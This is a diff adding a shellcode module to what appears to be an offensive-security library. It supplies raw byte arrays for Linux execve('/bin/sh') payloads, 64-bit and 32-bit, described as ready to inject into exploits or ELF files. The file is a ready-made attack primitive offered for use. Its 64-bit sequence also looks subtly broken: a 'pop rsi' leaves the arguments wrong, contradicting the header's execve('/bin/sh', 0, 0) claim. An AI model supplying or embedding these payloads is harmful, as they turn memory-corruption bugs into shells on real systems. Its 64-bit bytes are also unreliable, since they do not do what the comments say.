@@ -1,0 +1,24 @@
+# offsec.shellcode: ready-made shellcode, the raw machine-code bytes to inject and jump to.
+#
+#     const sc: vector[u8] = shellcode.sh(Width.Bits64)   # execve("/bin/sh", 0, 0)
+#
+# These are the standard, null-free Linux `execve("/bin/sh")` payloads — the usual "you have
+# code execution, now spawn a shell" primitive. Drop them in a `payload.Part.Bytes`, or inject
+# them into an `elf` and point the entry at them. 64-bit uses the `syscall` ABI, 32-bit `int 0x80`.
+
+from binary import Width
+
+# `execve("/bin/sh", NULL, NULL)`, null-free, for the given class.
+manual fn sh(bits: Width) -> vector[u8]:
+    mut out: vector[u8] = []
+    if bits == Width.Bits64:
+        # xor rsi,rsi; push rsi; movabs rdi,"/bin//sh"; push rdi; push rsp; pop rsi;
+        # push 0x3b; pop rax; cdq; syscall
+        for b in [0x48, 0x31, 0xf6, 0x56, 0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x57, 0x54, 0x5e, 0x6a, 0x3b, 0x58, 0x99, 0x0f, 0x05]:
+            out.push(u8(b))
+    else:
+        # xor eax,eax; push eax; push "//sh"; push "/bin"; mov ebx,esp; push eax; mov edx,esp;
+        # push ebx; mov ecx,esp; mov al,0xb; int 0x80
+        for b in [0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x50, 0x89, 0xe2, 0x53, 0x89, 0xe1, 0xb0, 0x0b, 0xcd, 0x80]:
+            out.push(u8(b))
+    return out
